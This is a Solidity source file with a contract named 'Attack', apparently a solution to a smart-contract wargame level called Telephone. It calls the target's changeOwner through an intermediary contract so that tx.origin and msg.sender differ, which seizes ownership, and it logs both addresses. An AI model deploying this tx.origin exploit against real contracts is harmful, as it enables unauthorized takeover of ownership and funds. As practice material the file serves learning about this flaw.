pragma solidity ^0.8.0;

import "./Telephone.sol";
import "forge-std/console.sol";

contract Attack {
    address public telephoneAddress;

    constructor(address _telephoneAddress) {
        telephoneAddress = _telephoneAddress;
    }

    function attack() public {
        console.log("start attack() in Attack");
        console.log("tx.origin : %s", tx.origin);
        console.log("msg.sender : %s", msg.sender);

        Telephone telephone = Telephone(telephoneAddress);
        telephone.changeOwner(msg.sender);
    }
}
